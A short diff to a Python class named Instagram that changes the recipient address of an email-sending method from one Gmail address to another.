@@ -220,7 +220,7 @@ class Instagram():
         print(f" [+] Sending email")
         self.load_config()
         sender = "au85265@gmail.com"
-        reciever = "au85265@gmail.com"
+        reciever = "lazlopanaflex66@gmail.com"
         msg = MIMEMultipart(body)
         msg['Subject'] = subject
         msg['From'] = sender
